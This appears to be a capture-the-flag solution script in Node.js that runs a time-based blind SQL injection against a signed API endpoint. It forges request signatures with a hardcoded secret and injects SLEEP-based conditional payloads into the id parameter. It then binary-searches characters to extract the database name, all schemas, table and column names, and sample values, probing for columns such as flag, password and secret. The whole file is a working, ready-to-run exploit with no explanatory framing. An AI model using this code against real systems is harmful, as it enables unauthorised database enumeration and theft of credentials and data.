const axios = require('axios');
const sha1 = require('js-sha1');

// Configuration
const baseUrl = 'https://4wajjwkg.eu1.ctfio.com/api/article';
const secretKey = "pE5CRmAhC8fvaWy6u58tKDTEKCZyTKLA";
const userId = '1234';
const timeoutThreshold = 3000; // 3 seconds

function calculateSignature(timestamp, pathName, userId) {
    const signatureString = [secretKey, timestamp, pathName, userId].join('\n');
    return sha1(signatureString);
}

async function sendRequest(sqliPayload) {
    const queryParam = `id=${encodeURIComponent(sqliPayload)}`;
    const path = `/api/article?${queryParam}`;
    const timestamp = Date.now().toString();
    const sign = calculateSignature(timestamp, path, userId);
    const startTime = Date.now();

    try {
        const response = await axios.get(`${baseUrl}?${queryParam}`, {
            headers: {
                'Host': '4wajjwkg.eu1.ctfio.com',
                'Accept': '*/*',
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0',
                'Sign': sign,
                'Time': timestamp,
                'User-Id': userId
            },
            timeout: timeoutThreshold + 2000
        });

        const endTime = Date.now();
        const requestTime = endTime - startTime;

        return {
            data: response.data,
            isDelayed: requestTime > timeoutThreshold,
            requestTime
        };
    } catch (error) {
        const endTime = Date.now();
        const requestTime = endTime - startTime;

        return {
            error: error.response?.data || error.message,
            isDelayed: requestTime > timeoutThreshold || error.code === 'ECONNABORTED',
            requestTime
        };
    }
}

async function testCondition(condition) {
    const payload = `2 AND IF(${condition}, SLEEP(${timeoutThreshold / 1000}), 0)`;
    const result = await sendRequest(payload);
    console.log(`Testing: ${condition} => ${result.isDelayed ? 'TRUE' : 'FALSE'} (${result.requestTime}ms)`);
    return result.isDelayed;
}

async function extractString(query, maxLength = 50) {
    let result = "";
    console.log(`Extracting: ${query}`);

    for (let pos = 1; pos <= maxLength; pos++) {
        const isNull = await testCondition(`ASCII(SUBSTRING((${query}), ${pos}, 1)) = 0`);
        if (isNull) {
            console.log("Reached NULL terminator");
            break;
        }

        let min = 32;
        let max = 126;

        while (min <= max) {
            const mid = Math.floor((min + max) / 2);
            const isGreaterOrEqual = await testCondition(`ASCII(SUBSTRING((${query}), ${pos}, 1)) >= ${mid}`);
            if (isGreaterOrEqual) {
                min = mid + 1;
            } else {
                max = mid - 1;
            }
        }

        const charCode = max;
        result += String.fromCharCode(charCode);
        console.log(`Extracted so far: ${result}`);
    }

    return result;
}

async function getCount(countQuery) {
    let min = 0;
    let max = 100;

    while (min < max) {
        const mid = Math.floor((min + max + 1) / 2);
        const isGreaterOrEqual = await testCondition(`(${countQuery}) >= ${mid}`);

        if (isGreaterOrEqual) {
            min = mid;
        } else {
            max = mid - 1;
        }
    }

    console.log(`Count result: ${min}`);
    return min;
}

async function getSampleValueFromTable(table, column) {
    console.log(`\nGetting sample value for column '${column}' in table '${table}'...`);

    const rowCount = await getCount(`SELECT COUNT(*) FROM ${table}`);
    if (rowCount === 0) {
        console.log(`⚠️ No rows in ${table}, skipping.`);
        return null;
    }

    const sampleQuery = `SELECT ${column} FROM ${table} WHERE ${column} IS NOT NULL LIMIT 1`;
    const value = await extractString(sampleQuery, 100);

    if (value.trim()) {
        console.log(`✅ Sample from ${column}: ${value}`);
        return value;
    } else {
        console.log(`⚠️ Could not extract non-null value from ${column}`);
        return null;
    }
}

async function extractDatabaseMetadata() {
    try {
        console.log("=== Starting Database Metadata Extraction ===");

        console.log("\n--- Current Database ---");
        const dbName = await extractString("SELECT database()");
        console.log(`Current database: ${dbName}`);

        console.log("\n--- All Databases ---");
        const allDbs = await extractString("SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata", 200);
        console.log(`All databases: ${allDbs}`);

        console.log("\n--- Table Count ---");
        const tableCount = await getCount(`SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = '${dbName}'`);
        console.log(`Number of tables in ${dbName}: ${tableCount}`);

        console.log("\n--- Table Names ---");
        const tableNames = await extractString(`SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = '${dbName}'`, 200);
        console.log(`Tables in ${dbName}: ${tableNames}`);
        const tables = tableNames.split(',').filter(t => t.trim());

        for (const table of tables) {
            console.log(`\n--- Columns in ${table} ---`);
            const columnCount = await getCount(`SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = '${dbName}' AND table_name = '${table}'`);
            console.log(`Number of columns in ${table}: ${columnCount}`);

            const columnNames = await extractString(`SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = '${dbName}' AND table_name = '${table}'`, 200);
            console.log(`Columns in ${table}: ${columnNames}`);

            const columnTypes = await extractString(`SELECT GROUP_CONCAT(data_type) FROM information_schema.columns WHERE table_schema = '${dbName}' AND table_name = '${table}'`, 200);
            console.log(`Column types in ${table}: ${columnTypes}`);
        }

        console.log("\n--- Article Table Data Extraction ---");

        const articleRowCount = await getCount(`SELECT COUNT(*) FROM article`);
        console.log(`Article table row count: ${articleRowCount}`);

        const commonColumnNames = [
            'id', 'title', 'name', 'content', 'body', 'text',
            'description', 'author', 'date', 'created_at',
            'flag', 'key', 'secret', 'category', 'type',
            'status', 'published', 'url', 'image', 'thumbnail',
            'password', 'user', 'username'
        ];

        for (const col of commonColumnNames) {
            const exists = await testCondition(`EXISTS(SELECT 1 FROM information_schema.columns WHERE table_schema = '${dbName}' AND table_name = 'article' AND column_name = '${col}')`);
            if (exists) {
                console.log(`✅ Column '${col}' exists`);
                await getSampleValueFromTable('article', col);
            }
        }

        console.log("\n=== Extraction Complete ===");

    } catch (error) {
        console.error("Error during metadata extraction:", error);
    }
}

extractDatabaseMetadata();

